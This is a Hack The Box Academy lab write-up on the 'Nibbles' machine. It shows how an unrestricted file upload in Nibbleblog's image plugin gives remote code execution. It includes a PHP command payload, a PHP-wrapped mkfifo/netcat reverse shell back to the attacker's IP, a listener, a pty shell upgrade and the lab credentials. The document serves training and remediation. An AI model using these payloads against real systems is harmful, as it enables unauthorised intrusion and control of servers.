# HTB Academy — Nibbles: Initial Foothold

## Overview

This write-up documents my hands-on experience exploiting a vulnerable Nibbleblog installation in a controlled Hack The Box Academy environment.

The objective was to gain an initial foothold on the target server, obtain remote command execution, establish a reverse shell, and locate the `user.txt` flag.

The exploitation process involved identifying a vulnerable file upload functionality in the Nibbleblog administrative interface and using it to execute PHP code on the server.

**Platform:** Hack The Box Academy  
**Target:** Nibbles  
**Operating System:** Linux (Ubuntu)  
**Web Server:** Apache 2.4.18  
**Web Application:** Nibbleblog  
**Target IP:** `10.129.200.170`  
**Attacker VPN IP:** `10.10.15.10`  
**Access Obtained:** `nibbler`  
**Objective:** Locate and retrieve `user.txt`  
**Result:** Initial foothold successfully established; user flag located.

> **Note:** The IP addresses shown belong to the temporary HTB lab environment.

---

## 1. Initial Reconnaissance

The first step was to verify whether the target web application was accessible.

I executed the following command:

```bash
curl -I http://10.129.200.170/nibbleblog/
```

The server responded with:

```text
HTTP/1.1 200 OK
Server: Apache/2.4.18 (Ubuntu)
Content-Type: text/html; charset=UTF-8
```

The `200 OK` response confirmed that the web application was accessible.

The HTTP response headers also revealed that the target was running Apache 2.4.18 on Ubuntu.

### Command Explanation

- `curl`: Sends HTTP requests to a server.
- `-I`: Retrieves HTTP response headers.
- `http://10.129.200.170/nibbleblog/`: Target web application URL.

---

## 2. Accessing the Nibbleblog Administration Panel

After confirming that the web server was running, I navigated to:

```text
http://10.129.200.170/nibbleblog/admin.php
```

The application displayed the Nibbleblog administrator login page.

I authenticated using the lab credentials:

```text
Username: admin
Password: nibbles
```

Authentication was successful, granting access to the administrative dashboard.

The dashboard contained several sections, including:

- Publish
- Comments
- Manage
- Settings
- Themes
- Plugins

The **Plugins** section was particularly interesting because it contained functionality for uploading files.

---

## 3. Identifying the Vulnerable Plugin

Inside the administrative dashboard, I navigated to:

```text
Plugins → My image → Configure
```

The `My image` plugin provided an image upload functionality.

This presented a potential attack vector because the application could improperly handle uploaded files.

Instead of uploading a legitimate image, I tested whether the server would accept and execute a PHP file.

### Vulnerability Concept

**Unrestricted File Upload** occurs when an application does not adequately restrict or validate uploaded files.

If an attacker can upload server-side executable code and access it through the web server, this may lead to **Remote Code Execution (RCE)**.

---

## 4. Creating a PHP Command Execution Test

To verify whether PHP execution was possible, I created a file named `teste.php` on my attacker machine.

```bash
echo "<?php system('id'); ?>" > ~/Desktop/teste.php
```

### PHP Payload

```php
<?php system('id'); ?>
```

### Explanation

- `<?php ... ?>`: Defines PHP code.
- `system()`: Executes an operating system command.
- `id`: Displays the current user ID, group ID, and associated groups.

The purpose of this payload was to confirm code execution without performing destructive actions.

---

## 5. Uploading the PHP File

I returned to the `My image` plugin configuration page and uploaded `teste.php`.

The application displayed several PHP warnings related to image processing, including:

```text
Warning: imagesx() expects parameter 1 to be resource, boolean given

Warning: imagesy() expects parameter 1 to be resource, boolean given

Warning: imagecreatetruecolor(): Invalid image dimensions
```

These warnings occurred because the uploaded PHP file was not a valid image.

However, the application also displayed:

```text
Changes has been saved successfully
```

This suggested that the file had been accepted despite the image-processing errors.

The next step was to verify whether the uploaded PHP code could actually execute.

---

## 6. Confirming Remote Code Execution

Based on the Nibbleblog plugin directory structure, I accessed the uploaded file using:

```bash
curl http://10.129.200.170/nibbleblog/content/private/plugins/my_image/image.php
```

The server returned:

```text
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

### Result

Remote command execution was successfully confirmed.

The output demonstrated that commands executed through the uploaded PHP file were running under the `nibbler` user account.

At this point, I had achieved **Remote Code Execution (RCE)**, but I did not yet have an interactive shell.

---

## 7. Identifying the Attacker VPN Address

Before establishing a reverse shell, I needed to identify the VPN address assigned to my attacker machine.

I executed:

```bash
ip -4 addr show tun0
```

The output included:

```text
inet 10.10.15.10/23 scope global tun0
```

This confirmed that my attacker VPN IP address was:

```text
10.10.15.10
```

This address would be used as the destination for the reverse shell connection.

---

## 8. Preparing the Reverse Shell Payload

I modified the previously created PHP file to execute a Bash reverse shell.

```bash
cat > ~/Desktop/teste.php <<'EOF'
<?php system("rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.15.10 9443 > /tmp/f"); ?>
EOF
```

### Payload Explanation

| Component | Purpose |
|---|---|
| `rm -f /tmp/f` | Removes an existing FIFO file if present |
| `mkfifo /tmp/f` | Creates a named pipe |
| `cat /tmp/f` | Reads commands from the named pipe |
| `/bin/sh -i` | Starts an interactive shell |
| `2>&1` | Redirects standard error to standard output |
| `nc 10.10.15.10 9443` | Connects to the attacker machine |
| `>/tmp/f` | Redirects received data back into the named pipe |

This payload was designed to establish a reverse shell connection from the target server to my attacker machine.

I uploaded the modified `teste.php` file again through:

```text
Plugins → My image → Configure
```

The same image-processing warnings appeared during the upload.

---

## 9. Starting the Netcat Listener

On the attacker machine, I started a Netcat listener:

```bash
nc -lvnp 9443
```

The terminal displayed:

```text
Listening on 0.0.0.0 9443
```

### Command Explanation

- `nc`: Netcat networking utility.
- `-l`: Listen for incoming connections.
- `-v`: Enable verbose output.
- `-n`: Disable DNS resolution.
- `-p 9443`: Use port 9443.

The listener was now waiting for the target server to initiate a connection.

---

## 10. Triggering the Reverse Shell

With the listener running, I opened another terminal and accessed the uploaded PHP file again:

```bash
curl http://10.129.200.170/nibbleblog/content/private/plugins/my_image/image.php
```

The Netcat listener received a connection:

```text
Listening on 0.0.0.0 9443
Connection received on 10.129.200.170 48606
/bin/sh: 0: can't access tty; job control turned off
$
```

### Result

The reverse shell was successfully established.

The message:

```text
can't access tty; job control turned off
```

indicated that the shell did not have a fully interactive terminal.

However, remote command execution through the shell was available.

---

## 11. Upgrading the Reverse Shell

To improve shell interactivity, I used Python 3 to spawn a pseudo-terminal.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Command Explanation

- `python3`: Executes Python 3.
- `import pty`: Imports the pseudo-terminal module.
- `pty.spawn("/bin/bash")`: Starts Bash inside a pseudo-terminal.

After executing the command, the terminal displayed a prompt similar to:

```text
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$
```

This confirmed that I was interacting with the target system as the `nibbler` user.

---

## 12. Enumerating the User Directory

With shell access established, I navigated to the user's home directory.

```bash
cd /home/nibbler && ls -la
```

The directory listing revealed:

```text
personal.zip
user.txt
```

### Findings

- `personal.zip`: A compressed archive available in the user's home directory.
- `user.txt`: The flag file required to complete the HTB Academy exercise.

The `user.txt` file was owned by the `nibbler` user and was accessible with the privileges obtained during exploitation.

---

## 13. Retrieving the User Flag

After locating the flag, the final command was:

```bash
cat /home/nibbler/user.txt
```

The command reads the contents of the user flag file.

For documentation purposes, the actual flag value is intentionally omitted.

```text
[USER FLAG REDACTED]
```

### Final Result

**Initial Foothold: Successful**

- Administrative access obtained.
- Vulnerable file upload functionality identified.
- Remote Code Execution confirmed.
- Reverse shell established.
- Shell upgraded using Python 3.
- User directory enumerated.
- `user.txt` located.

---

## 14. Commands Used

| Command | Purpose |
|---|---|
| `curl -I <URL>` | Inspect HTTP response headers |
| `echo "<?php system('id'); ?>" > teste.php` | Create PHP command execution test |
| `curl <PHP_URL>` | Trigger uploaded PHP code |
| `ip -4 addr show tun0` | Identify attacker VPN IP |
| `cat > teste.php <<'EOF'` | Write the reverse shell PHP payload |
| `rm -f /tmp/f` | Remove an existing named pipe |
| `mkfifo /tmp/f` | Create a FIFO |
| `nc -lvnp 9443` | Start a Netcat listener |
| `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade shell interactivity |
| `cd /home/nibbler && ls -la` | Enumerate the user's home directory |
| `cat /home/nibbler/user.txt` | Read the user flag |

---

## 15. Security Impact

The vulnerability demonstrated how an authenticated user with access to an inadequately secured file upload feature could execute arbitrary commands on the underlying server.

Potential consequences include:

- Remote Code Execution.
- Unauthorized operating system access.
- Exposure of application and system files.
- Further enumeration of the compromised host.
- Potential privilege escalation through additional vulnerabilities.

The impact depends on the privileges of the web application process and the security controls implemented on the server.

## 16. Remediation Recommendations

To reduce the risk of similar vulnerabilities, organizations should consider:

1. Enforcing strict file type validation.
2. Validating uploaded file content rather than trusting file extensions.
3. Preventing execution of uploaded files.
4. Storing uploads outside executable web directories whenever possible.
5. Applying least-privilege permissions to web server processes.
6. Updating vulnerable applications and plugins.
7. Monitoring suspicious uploads and unexpected server-side code execution.
8. Restricting administrative access and enforcing strong authentication.

---

## 17. Key Takeaways

This lab reinforced several important penetration testing concepts:

- Administrative access can expose additional attack surfaces.
- File upload functionality requires careful security validation.
- PHP code execution can provide an initial foothold.
- Reverse shells allow interactive access to a compromised lab environment.
- Shell upgrades improve usability during post-exploitation.
- Local enumeration is essential after obtaining access.
- Clear documentation makes technical findings reproducible and easier to understand.

---

## Disclaimer

This exercise was completed in an authorized **Hack The Box Academy laboratory environment** for educational purposes.

All commands and techniques documented here were used exclusively within the controlled training environment.

**Platform:** Hack The Box Academy  
**Lab:** Nibbles — Initial Foothold  
**Outcome:** User-level access successfully obtained.


<img width="1910" height="895" alt="image" src="https://github.com/user-attachments/assets/b0f9e05a-7bff-4214-8287-ca878ba5fec6" />

<img width="942" height="676" alt="image" src="https://github.com/user-attachments/assets/432e2b03-09ad-48bd-9f9b-b8cf5bf480cc" />
